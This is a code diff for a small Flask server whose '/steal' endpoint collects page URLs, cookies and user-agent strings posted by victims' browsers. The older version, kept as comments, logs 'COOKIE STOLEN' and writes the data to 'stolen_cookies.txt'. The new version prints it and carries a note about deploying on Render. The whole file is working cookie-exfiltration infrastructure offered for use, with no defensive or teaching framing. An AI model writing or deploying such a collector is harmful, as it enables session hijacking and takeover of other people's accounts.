@@ -1,24 +1,52 @@
-from flask import Flask, request 
+# from flask import Flask, request 
+# from flask_cors import CORS
+
+# app = Flask(__name__) 
+# CORS(app)
+
+# @app.route('/', methods=['GET'])
+# def home():
+#     return "Server is running over HTTPS!"
+
+# @app.route('/steal', methods=['POST'])
+# def steal():
+#     data= request.json
+#     print("\n--- COOKIE STOLEN ---") 
+#     print(f"URL: {data['url']}") 
+#     print(f"Cookies: {data['cookies']}") 
+    
+#     with open("stolen_cookies.txt", "a") as f:
+#         f.write (f"URL: {data['url']}\nCookies: {data['cookies']}\n\n")
+#     return "OK"
+
+# if __name__ == '__main__': 
+#     # app.run(host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem')) 
+#     app.run()
+
+
+
+
+
+from flask import Flask, request
 from flask_cors import CORS
 
-app = Flask(__name__) 
+app = Flask(__name__)
 CORS(app)
 
 @app.route('/', methods=['GET'])
 def home():
-    return "Server is running over HTTPS!"
+    return "Server is running!"
 
 @app.route('/steal', methods=['POST'])
 def steal():
-    data= request.json
-    print("\n--- COOKIE STOLEN ---") 
-    print(f"URL: {data['url']}") 
-    print(f"Cookies: {data['cookies']}") 
+    data = request.json
     
-    with open("stolen_cookies.txt", "a") as f:
-        f.write (f"URL: {data['url']}\nCookies: {data['cookies']}\n\n")
-    return "OK"
+    print("\n===== COOKIE RECEIVED =====")
+    print("URL:", data.get('url'))
+    print("Cookies:", data.get('cookies'))
+    print("User-Agent:", data.get('ua'))
+    print("==========================\n")
+    
+    return "OK", 200
 
-if __name__ == '__main__': 
-    # app.run(host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem')) 
-    app.run()
+# ❌ REMOVE app.run() completely (Render doesn't need it)
